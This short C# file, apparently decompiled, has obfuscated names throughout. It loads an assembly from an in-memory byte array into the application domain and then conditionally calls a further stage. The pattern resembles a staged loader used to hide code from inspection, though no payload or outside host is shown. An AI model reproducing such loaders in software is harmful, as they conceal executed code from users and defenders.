using System.Reflection;
using System.Threading;
using w8E;
using y4S;

namespace b4D;

public class Zt3
{
	internal static void a8Y()
	{
		Assembly value = Thread.GetDomain().Load((byte[])Cj0.mDic[Cj0.mArray]);
		Cj0.mDic.Add("Ass2", value);
		value = null;
		Qy5();
	}

	internal static void Qy5()
	{
		if (Cj0.Df3())
		{
			Si0.w3N();
		}
	}
}
